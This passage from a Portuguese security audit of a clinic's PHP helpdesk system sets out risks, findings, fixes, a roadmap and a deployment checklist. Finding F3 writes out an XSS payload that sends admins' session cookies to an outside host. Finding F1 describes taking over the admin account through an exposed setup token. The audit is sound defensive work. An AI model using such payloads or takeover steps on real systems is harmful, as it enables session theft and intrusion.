Contexto: clínica. Estimar volume real (chamados/mês, nº impressoras, nº técnicos) — **NÃO VALIDADO**. Projeção qualitativa das tabelas que crescem sem poda:

| Tabela | Crescimento | Quando incomoda |
|---|---|---|
| `impressoras_snapshot` | N impressoras × 6/dia (cron 4h) | 20 impressoras → ~44k linhas/ano. 5 anos ≈ 220k. `raw_snmp` TEXT por linha = maior custo de disco. **Adicionar poda: manter 90 dias + 1 snapshot/dia agregado** |
| `audit_log` | 1 por ação de escrita | moderado; sem poda. Definir retenção (ex. 2 anos) |
| `historico` | ~3-5 por chamado | acompanha volume de chamados; ok por muitos anos |
| `email_queue` | 1 por notificação; **poda de 30 dias existe** (`cron_email.php:50`) | ok |
| `estoque_movimentos` | 1 por item entregue/ajuste | baixo volume; ok |
| `hosts_rede` | 1 por MAC único visto | limitado ao tamanho da rede (~centenas); ok |

Nenhuma tabela vira problema em <3 anos no volume de uma clínica. `impressoras_snapshot.raw_snmp` é a primeira a atacar.

---

## 12. Frontend / Code Quality Audit

- **CDN sem SRI nem CSP:** `layout.php:13-14`, `portal.php`, `login.php`, `avaliar.php` etc. carregam Bootstrap 5.3.2 + bootstrap-icons de `cdn.jsdelivr.net` sem `integrity=`. Comprometimento do CDN = execução de JS na tela de login e no painel admin. Adicionar SRI + `Content-Security-Policy`.
- **`innerHTML` com dados de servidor:** ver 4.4 (XSS). Também `layout.php:737` usa `n.cor`, `n.link` interpolados em atributos `style=`/`href=` sem sanitização.
- **`localStorage`:** só `theme`, `sidebar-collapsed`, `nav-sec`, `table-sort:*`. **Nenhum dado sensível.** OK.
- **`sync_inventario.php:137-139`** — expressão indefensável:
  ```php
  return $pdo->prepare($sql)->execute($params) ? $pdo->prepare($sql)->execute($params) && false ?: (function() use (...) { ... })() : [];
  ```
  Prepara e executa a query **3 vezes**, com ternário aninhado e IIFE. A "versão limpa" (`listar_equipamentos_chamado`, linha 143) existe logo abaixo — a suja é código morto a remover.
- **`avaliar.php:25-27`** — `$jaAvaliado = (bool)$pdo->prepare(...)->execute([$id]) && $pdo->query("... chamado_id = {$id}")->fetchColumn() > 0;` — `execute()` retorna bool, sempre true; depois uma segunda query crua desnecessária. Reescrever para um `SELECT COUNT(*)` com placeholder.
- **`portal.php` try/catch mascarando schema drift** (`portal.php:60-66`): tenta `INSERT` com `telefone_solicitante`, no `catch (PDOException)` tenta sem. Esconde a ausência da coluna em vez de corrigir o schema.
- **`config.php:24`** — `define('DEBUG_MODE', $_cfg['DEBUG_MODE'] ?? false)` + `db.php:20` `ERRMODE_SILENT` quando false → **erros de PDO são engolidos em produção**. Vários `->execute()` sem checar retorno (`resetar_senha.php:34`, `cron_*`, `sync_*`). Falha de escrita = silenciosa = perda de dados sem rastro. Usar `ERRMODE_EXCEPTION` sempre + `try/catch` + log.
- **`declare(strict_types=1)`** ausente em todos os arquivos. Tipos de retorno já são usados (`function db(): PDO`) — dá para introduzir strict_types incrementalmente.
- **`gemini.php:13`** — `$minTokens = $maxTokens;` variável renomeada sem motivo; morto.
- **`.bak` no repositório** — usar Git, não cópias `arquivo.php.bak`.

---

## 13. LGPD / Data Governance

**Dados pessoais identificados:**

| Dado | Onde | Classificação |
|---|---|---|
| Nome completo do solicitante | `chamados.solicitante`, `pedidos_suprimentos.solicitante`, `termos_uso.responsavel_nome` | Pessoal |
| Telefone/ramal | `chamados.telefone_solicitante` | Pessoal |
| E-mail | `usuarios.email`, `password_resets.email` | Pessoal |
| Setor / lotação | vários | Pessoal (contexto) |
| Descrição do chamado | `chamados.descricao` | Pessoal, potencialmente **sensível** (pode citar saúde de colaborador, dados de pacientes em prints) |
| Imagens anexadas | `uploads/`, `chamados.imagens` | Pessoal/sensível — **prints de sistemas médicos** |
| IP / MAC / hostname | `hosts_rede`, `inventario`, `audit_log`, `login_attempts` | Técnico/rastreável |
| Hash de senha | `usuarios.senha` | Credencial |

**Riscos técnicos de proteção de dados (não é parecer jurídico):**
- **Exposição não autenticada** (4.6): listagem pública de nome+telefone+setor+descrição de todos os solicitantes. Maior risco LGPD do sistema.
- **Dump de banco no webroot** (4.10): `ti_chamados_backup.sql` baixável = vazamento de e-mails + hashes.
- **Imagens em `uploads/` com nome aleatório mas sem controle de acesso** — quem tiver a URL (ou o número do chamado) vê a imagem. Sem expiração.
- **Retenção:** nenhuma política. `audit_log`, `historico`, snapshots crescem para sempre. Soft-delete (`deleted_at`) preserva o chamado "excluído" indefinidamente (o comentário em `excluir_chamado.php` diz "cumpre LGPD" — na prática é o oposto: retém em vez de eliminar).
- **Minimização:** `raw_snmp` (TEXT) e `scan_rede_*.csv` guardam mais do que o necessário.
- **Direito de eliminação:** não há fluxo para apagar dados de uma pessoa a pedido.

---

## 14. Disaster Recovery

**Cenário: servidor de produção perdido totalmente às 03:00 de domingo.**

O que existe hoje: **nada verificável**. Não há script de backup no repo, nenhuma referência a backup externo, nenhum RPO/RTO definido. Presume-se o backup automático do cPanel/Hostgator (retenção e periodicidade típicas: diário, alguns dias — **NÃO VALIDADO**).

Para restaurar seria necessário:
1. Provisionar hospedagem nova (cPanel).
2. `git clone` do código (o repo **não** contém o schema completo nem `config.local.php`).
3. Reconstruir o schema: rodar `migrations.sql` + `missing_tables.sql` + **acionar cada página que tem `CREATE TABLE IF NOT EXISTS`** (frágil) ou `setup.php`.
4. Restaurar o dump do MySQL do backup do cPanel (se existir e estiver íntegro).
5. Recriar `config.local.php` com as credenciais (onde estão guardadas? **risco de perda das credenciais Gemini/DB**).
6. Recriar `uploads/` (imagens de chamados e contratos) — **só existem no servidor**, o `.gitignore` os exclui. Se o backup do cPanel não pegar `uploads/`, perda total dos anexos.
7. Reconfigurar os 4 cron jobs no painel.

**RPO real estimado:** 24h (backup diário do host) — **NÃO VALIDADO**.
**RTO real estimado:** 4–8h de trabalho manual, assumindo que dump e `uploads/` estejam no backup.

**Ações:** (a) script `bin/backup.sh` (mysqldump + tar de `uploads/` → storage externo, ex. rclone p/ S3/Drive); (b) schema único versionado; (c) `config.local.php` guardado em gerenciador de segredos + documentado; (d) testar restore uma vez.

---

## 15. Observability

Hoje: `echo` para stdout redirecionado a `/tmp/*.log` nos crons; `error_log` do PHP-FPM para o resto; `audit_log` no banco (bom, mas só ações de escrita da UI). **Sem** health check, métricas, alerta de job que não rodou, tracking de erro.

Compatível com cPanel/Hostgator:
- **Health check:** `health.php` (fora do menu, com token) retornando JSON: conexão DB, `email_queue` pendente há >10min, último `impressoras_snapshot`, último scan, disco de `uploads/`.
- **Job heartbeat:** cada cron grava `cron_runs(nome, terminou_em, ok)` ao final; `notificacoes.php` (ou health) alerta se um cron não roda há 2× o intervalo.
- **Structured logging:** função `logJson($nivel, $evento, $ctx)` → arquivo em `logs/` (fora do webroot) em JSON-lines.
- **Error tracking:** Sentry tem SDK PHP que funciona em shared hosting (só HTTP out). Baixo esforço, alto retorno.
- Trocar `ERRMODE_SILENT` por `EXCEPTION` + handler global que loga e mostra página 500 amigável.

---

## 16. Risk Matrix

| ID | Problema | Categoria | Prob. | Impacto | Severidade | Evidência |
|---|---|---|---|---|---|---|
| R1 | `setup.php` em produção, token fixo, reseta admin | AuthZ / Takeover | Alta | Crítico | **CRÍTICO** | `setup.php:11,296` |
| R2 | Sem `.htaccess` raiz → `.bak`/`.sql`/scans baixáveis | Info Disclosure | Alta | Crítico | **CRÍTICO** | `ls` sem `.htaccess`; `.gitignore` |
| R3 | XSS armazenado portal público → sessão admin | XSS | Média | Crítico | **CRÍTICO** | `layout.php:737`, `notificacoes.php:24`, `busca_global.php:29`, `portal.php:28` |
| R4 | Portal expõe todos os chamados/pedidos + PII, sem auth | Broken Access / LGPD | Alta | Alto | **CRÍTICO** | `portal.php:115-138,216-237` |
| R5 | `avaliar.php` IDOR por `id` sequencial, sem token | IDOR | Média | Médio | **ALTO** | `avaliar.php:6,30-40` |
| R6 | Entrega de pedido não-idempotente → estoque debitado 2× | Concorrência | Média | Alto | **ALTO** | `pedidos_suprimentos.php:25-30` |
| R7 | Renovação de contrato roda em GET, sem lock, dupla | Concorrência | Média | Alto | **ALTO** | `contratos.php:152-178` |
| R8 | `cron_email` sem lock/claim → e-mail duplicado | Concorrência | Média | Médio | **ALTO** | `cron_email.php:19-47` |
| R9 | Chave Gemini na query string; endpoint IA sem login | Secret / Abuso | Média | Médio | **ALTO** | `gemini.php:12`, `api_ia.php:20` |
| R10 | Schema fragmentado, DDL em runtime, dump desatualizado | Manutenção / DR | Alta | Médio | **ALTO** | 6 arquivos c/ `CREATE TABLE IF NOT EXISTS` |
| R11 | SSRF via `impressoras.ip` → `file_get_contents(http://IP)` | SSRF | Baixa | Médio | **MÉDIO** | `snmp_coletar.php:332,348` |
| R12 | `avaliacoes` — regras divergentes; `UNIQUE(chamado_id)`? | Integridade | Média | Baixo | **MÉDIO** | `portal.php:90` vs `avaliar.php:37` |
| R13 | Sem timeout de sessão / privilégio é snapshot | AuthN | Baixa | Médio | **MÉDIO** | `db.php:29-52`, `login.php:29` |
| R14 | Sem rate limit em reset senha / abrir chamado | Abuso | Média | Baixo | **MÉDIO** | `esqueci_senha.php`, `portal.php` |
| R15 | `busca_global` / listagem pública com `LIKE '%q%'` | Performance | Média | Baixo | **MÉDIO** | `busca_global.php`, `portal.php:127` |
| R16 | CDN sem SRI/CSP | Supply chain | Baixa | Alto | **MÉDIO** | `layout.php:13` |
| R17 | `ERRMODE_SILENT` em prod → falhas silenciosas | Observability | Alta | Baixo | **MÉDIO** | `db.php:20` |
| R18 | `cron_scanner`/`snmp_coletar` sem guarda de SAPI | AuthZ | Baixa | Médio | **MÉDIO** | arquivos sem check `HTTP_HOST` |
| R19 | `chamados.setor` string livre, sem FK | Integridade | Alta | Baixo | **BAIXO** | dump `chamados` |
| R20 | `impressoras_snapshot.raw_snmp` sem poda | Escala | Média | Baixo | **BAIXO** | `snmp_coletar.php:124` |
| R21 | Backup/DR não verificável, `uploads/` fora de backup provável | DR | Média | Alto | **ALTO** | ausência de script |

---

## 17. Findings Detalhados (os que exigem código)

### F1 — `setup.php` acessível em produção → account takeover  [CRÍTICO]
**Arquivo:** `setup.php:11`, `setup.php:296-297`
**Evidência:** `define('SETUP_TOKEN','helpti2026');` + `INSERT INTO usuarios (...) ON DUPLICATE KEY UPDATE senha=VALUES(senha), perfil='admin'`.
**Cenário:** `GET /setup.php?token=helpti2026` → form → POST com `admin_email` = e-mail do admin real → senha sobrescrita → login como admin.
**Correção imediata:** remover `setup.php` do servidor.
**Correção estrutural:** instalador fora do webroot; token aleatório por execução gravado em arquivo que o operador deve criar manualmente.

### F2 — Arquivos sensíveis serviíveis por HTTP  [CRÍTICO]
**Arquivo:** raiz (sem `.htaccess`); `abrir.php.bak`, `acompanhar.php.bak`, `pedir_suprimento.php.bak`, `acompanhar_suprimentos.php.bak`, `ti_chamados_backup.sql`, `scan_ultimo.json`, `scan_rede_*.csv`, `config.local.php.example`.
**Cenário:** `GET /ti_chamados_backup.sql` → dump com e-mails e hashes. `GET /abrir.php.bak` → código-fonte. `GET /scan_ultimo.json` → mapa da rede interna.
**Correção imediata:** `.htaccess` na raiz:
```apache
<FilesMatch "\.(bak|sql|json|csv|md|example|log|py|sh|dist)$">
  Require all denied
</FilesMatch>
<FilesMatch "^(config|config\.local|db)\.php$">
  Require all denied
</FilesMatch>
```
+ `rm *.bak *.sql scan_*` do servidor. Verificar 200/403 depois.
**Correção estrutural:** webroot = `/public`; tudo o mais um nível acima.

### F3 — XSS armazenado: portal público → painel autenticado  [CRÍTICO]
**Arquivo:** entrada `portal.php:24-29` (setor não validado); saída `layout.php:737-746` e `layout.php:784-789` (`innerHTML`); dados `notificacoes.php:24`, `busca_global.php:27-32`.
**Evidência:**
```php
// portal.php — só checa não-vazio:
$setor = trim($_POST['setor'] ?? '');
if (!$setor) $chamado_erros[] = 'Selecione o setor.';
```
```js
// layout.php:
list.innerHTML = d.itens.map(n => `... ${n.texto} ...`).join('');
```
**Cenário:** abrir chamado anônimo com `setor` = `<img src=x onerror=fetch('//e/?c='+document.cookie)>` → técnico abre notificações → script roda com a sessão dele.
**Correção imediata:**
1. `portal.php`: `if (!in_array($setor, $SETORES, true)) $chamado_erros[] = 'Setor inválido.';`
2. `layout.php`: helper `const esc = s => { const d=document.createElement('div'); d.textContent=s??''; return d.innerHTML; };` e usar `${esc(n.texto)}`, `${esc(it.titulo)}` etc.; para `href`/`style` usar `encodeURI` / allowlist de cor.
**Correção estrutural:** construir os nós com `document.createElement` + `textContent`.

### F4 — Portal público lista todos os chamados e detalhes  [CRÍTICO / LGPD]
**Arquivo:** `portal.php:115-138` (busca por número → detalhe completo), `portal.php:216-237` (listagem + filtros), `portal.php:599-606` (imagens).
**Cenário:** `GET /portal.php?aba=ti&subaba=acompanhar` lista tudo; `&numero_chamado=CHM-2026-00002` (previsível, `db.php:58`) → nome, telefone, descrição, timeline, imagens de qualquer chamado.
**Correção imediata:** remover a listagem geral e a busca por nome do portal; exigir token opaco para o detalhe.
**Correção estrutural:** `chamados.acompanhamento_token` (random 16+ hex) gerado na abertura, incluído no link de sucesso e no e-mail; lookup por `numero AND token`.

### F5 — `avaliar.php` IDOR  [ALTO]
**Arquivo:** `avaliar.php:6,12-16,30-40`
**Evidência:** `$id = (int)($_GET['id'] ?? 0);` → `SELECT ... WHERE id = ?` → `INSERT INTO avaliacoes`. Sem token, `id` sequencial.
**Cenário:** `for id in 1..N: POST avaliar.php?id=$id nota=1` → polui as métricas de satisfação de todos os atendimentos.
**Correção:** `avaliacoes` por token único por chamado; link do e-mail usa `?t=<token>`.

### F6 — Entrega de pedido não-idempotente  [ALTO]
**Arquivo:** `pedidos_suprimentos.php:25-30`, `estoque_helpers.php:64-85`
**Correção imediata:**
```php
$upd = $pdo->prepare("UPDATE pedidos_suprimentos SET status='Entregue', observacoes_entrega=?
                      WHERE id=? AND status IN ('Pendente','Aprovado')");
$upd->execute([$obs, $pedido_id]);
if ($upd->rowCount() === 1) {
    estoque_debitar_pedido($pdo, $pedido_id, $u['id'] ?? null);
}
```
Envolver os dois passos em `beginTransaction`/`commit`.

### F7 — Renovação automática de contrato em page load  [ALTO]
**Arquivo:** `contratos.php:152-178`
**Correção imediata:** extrair para `bin/cron_contratos.php` (com `flock`); no `UPDATE` usar `WHERE id=? AND data_vencimento=? AND status='Ativo'` e checar `rowCount()`.
**Correção estrutural:** loop `while ($venc < hoje)` explícito e testado para contratos vencidos há vários períodos; timezone MySQL alinhado a `America/Sao_Paulo`.

### F8 — `cron_email.php` sem claim  [ALTO]
**Arquivo:** `cron_email.php:19-47`
**Correção:** `flock(fopen(__DIR__.'/logs/.email.lock','c'), LOCK_EX|LOCK_NB)` no topo (sai se não conseguir). Melhor: coluna `status enum('pending','sending','sent','failed')` + `locked_at`; `UPDATE ... SET status='sending' WHERE id IN (...) AND status='pending'` e processar só os confirmados.

### F9 — Chave Gemini na URL + endpoint sem login  [ALTO]
**Arquivo:** `gemini.php:12`, `api_ia.php:20-22`
**Correção:**
```php
$url = 'https://generativelanguage.googleapis.com/v1beta/models/gemini-...:generateContent';
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json', 'x-goog-api-key: '.$key]);
```
Em `api_ia.php`: rate-limit por IP (reusar tabela estilo `login_attempts`) para `classificar`; cache do resultado por hash(titulo+descricao) por alguns minutos; logar falhas de `geminiAsk`.

### F10 — Schema não versionado  [ALTO]
**Arquivo:** `estoque_helpers.php:9`, `esqueci_senha.php:14`, `contratos.php:12`, `cron_scanner.php:44`, `snmp_coletar.php:15`, `setup.php`.
**Correção:** consolidar em `database/migrations/0001_baseline.sql` (dump real de produção, `mysqldump --no-data`), remover todo `CREATE TABLE IF NOT EXISTS` do código de request, aplicar migrations por `bin/migrate.php` no deploy.

### F11 — SSRF em fallback HP  [MÉDIO]
**Arquivo:** `snmp_coletar.php:332,348`
**Correção:**
```php
if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) return null;
$long = ip2long($ip);
foreach ([['169.254.0.0','169.254.255.255'],['127.0.0.0','127.255.255.255']] as [$a,$b])
    if ($long >= ip2long($a) && $long <= ip2long($b)) return null;
// opcional: exigir que $ip esteja numa faixa RRFC1918 configurada da clínica
```

### F12 — `avaliacoes` regras divergentes  [MÉDIO]
**Arquivo:** `portal.php:90` (`ON DUPLICATE KEY UPDATE`), `avaliar.php:37` (`INSERT`).
**Correção:** decidir a regra (recomendo: 1 avaliação imutável por chamado), garantir `UNIQUE(chamado_id)`, usar o mesmo caminho de código nos dois pontos. **Verificar já** se o índice UNIQUE existe em produção.

---

## 18. Quick Wins (alto impacto, baixo esforço)

| # | Ação | Esforço | Elimina |
|---|---|---|---|
| Q1 | `rm setup.php` do servidor | 1 min | R1 |
| Q2 | `.htaccess` raiz + `rm *.bak *.sql scan_*` do servidor | 30 min | R2, R18 |
| Q3 | Validar `setor ∈ $SETORES` em `portal.php` | 15 min | metade de R3 + R19 |
| Q4 | Helper `esc()` nos `innerHTML` de `layout.php` | 1 h | R3 |
| Q5 | Remover listagem/busca pública de chamados do portal | 1 h | grande parte de R4 |
| Q6 | `WHERE status IN (...)` + `rowCount()` na entrega de pedido | 30 min | R6 |
| Q7 | Chave Gemini via header `x-goog-api-key` | 10 min | metade de R9 |
| Q8 | `ERRMODE_EXCEPTION` sempre + try/catch nos crons | 1 h | R17 |
| Q9 | `flock` no topo dos 4 crons | 1 h | R8 + parte de R7 |
| Q10 | SRI nos `<link>`/`<script>` de CDN | 30 min | R16 |

---

## 19. Roadmap

### P0 — Emergencial (esta semana)
- F1 (`rm setup.php`), F2 (`.htaccess` + limpeza), F3 (XSS: validar setor + `esc()`), F4 (fechar listagem pública).
- Verificar via HTTP se `ti_chamados_backup.sql` e `scan_ultimo.json` respondem 200 hoje. Se sim → **rotacionar senhas do banco e a chave Gemini**.
- Confirmar que `sync_inventario.php`, `snmp_coletar.php`, `cron_scanner.php` não são acessíveis por HTTP.

### P1 — Crítico (antes de qualquer expansão)
- F5 (token de avaliação), F6 (idempotência de entrega), F7 (renovação → cron), F8 (lock cron_email), F9 (rate-limit IA), F10 (schema versionado), F12 (regra de avaliação + UNIQUE).
- Rate limit em `esqueci_senha` e `portal` (R14). Timeout de sessão (R13).
- Script de backup + teste de restore (R21).

### P2 — Evolução (1–2 meses)
- Extrair `EstoqueService`, `SlaPolicy`, `ContratoRenovacao`, `Auth` guard.
- `declare(strict_types=1)` incremental.
- Health check + `cron_runs` heartbeat + Sentry.
- CSP completa.
- SLA por horário comercial (não relógio de parede).
- Máquina de estados de chamado.

### P3 — Futuro (condicionado a crescimento)
- Poda de `impressoras_snapshot`/`audit_log`.
- Tabela `impressoras_ultimo_snapshot` materializada.
- FULLTEXT search dedicada.
- Fila de e-mail com dead-letter e backoff.

---

## 20. Estratégia de Testes

**Unitários (PHPUnit — dá para rodar sem framework):**
- `EstoqueService::movimentar` — entrada/saída/ajuste, nunca negativo, gera movimento sempre, idempotência de entrega.
- `SlaPolicy` — cálculo por nível, chamado sem nível, concluído, horário comercial.
- `ContratoRenovacao` — vencido há 1 período / vários períodos / "Único" / periodicidade custom / timezone.
- `gerarNumero` — unicidade sob execução repetida.
- `Auth::require` — cada papel × cada endpoint.

**Integração (banco de teste):**
- Abertura de chamado pelo portal com `setor` inválido → rejeitado.
- Fila de e-mail: 2 workers concorrentes não enviam 2×.
- `cron_scanner` com `scan_ultimo.json` truncado → não corrompe `hosts_rede`.

**Segurança (checklist manual + script):**
- IDOR: `avaliar.php?id=N`, `numero_chamado` enumerável.
- XSS: `setor`/`descricao` com payload → inspecionar notificações e busca.
- CSRF: POST sem token em cada endpoint mutável.
- Arquivos: `curl -I` em `*.bak`, `*.sql`, `setup.php`, `config.php`.
- SSRF: `impressoras.ip = 127.0.0.1` → cron não conecta.

**E2E (fluxos críticos):**
1. abrir chamado → atribuir → atender → concluir → avaliar.
2. pedir suprimento → aprovar → entregar (1×) → estoque debitado exatamente 1×.
3. contrato vencendo → renovação → 1 linha de histórico.

---

## 21. Checklist de Produção (antes do próximo deploy)

- [ ] `setup.php` removido do servidor
- [ ] `.htaccess` raiz negando `.bak/.sql/.json/.csv/.md/.py` e `config*.php`
- [ ] `*.bak`, `*.sql`, `scan_*` removidos do webroot
- [ ] `curl -I https://.../ti_chamados_backup.sql` → 403/404
- [ ] `curl -I https://.../setup.php` → 403/404
- [ ] `curl -I https://.../snmp_coletar.php` → 403 (guarda de SAPI)
- [ ] `config.local.php` fora do Git e com backup das credenciais em local seguro
- [ ] chave Gemini rotacionada (se houve exposição) e movida para header
- [ ] `setor` validado contra `$SETORES` no portal
- [ ] `esc()` aplicado aos `innerHTML` de `layout.php`
- [ ] entrega de pedido idempotente (`rowCount`)
- [ ] `flock` nos 4 crons
- [ ] `ERRMODE_EXCEPTION` ativo
- [ ] schema consolidado em `database/migrations/`
- [ ] `UNIQUE(chamado_id)` confirmado em `avaliacoes`
- [ ] backup automatizado incluindo `uploads/` + restore testado 1×

---

## 22. Veredito Final

| Dimensão | Nota | Justificativa |
|---|---|---|
| Arquitetura | 5 | monólito coerente e legível, mas god files e regra de negócio espalhada |
| Segurança | 2 | CSRF/PDO/hash bem feitos, anulados por setup.php, arquivos expostos, XSS público→admin, IDOR |
| Banco | 4 | FKs razoáveis onde existem, mas schema fragmentado, DDL em runtime, dump desatualizado |
| Código | 5 | consistente e sem SQLi, mas erros engolidos, funções monstro pontuais, `.bak` versionados |
| Performance | 6 | ok para o volume de uma clínica; `LIKE '%%'` e notificações a cada 60s são desperdício |
| Escalabilidade | 6 | nenhuma tabela vira problema em <3 anos; falta poda de snapshots |
| Observabilidade | 3 | só `echo` e `audit_log`; erros silenciosos; sem heartbeat de cron |
| DevOps | 3 | sem CI, sem migrations, deploy manual, DR não verificável |
| Testabilidade | 2 | zero testes, lógica acoplada a request/HTML, mas extraível |
| Manutenibilidade | 5 | código claro e comentado em PT; dívida concentrada e endereçável |

**Global: 4/10 — Alto risco.** O sistema **não precisa ser reescrito**. Precisa de ~1 semana de P0 para sair da zona crítica e ~1 mês de P1 para ficar seguro para expansão. A base de engenharia é boa o suficiente para justificar a manutenção da arquitetura atual.

---

## 23. Regras para a etapa de correção

Ao corrigir, para cada finding: **não reescrever o sistema**, preservar compatibilidade com produção, um PR por finding (ou por grupo P0), sem mudar comportamento além do necessário para fechar a falha, e adicionar o teste correspondente da seção 20 junto com o fix.
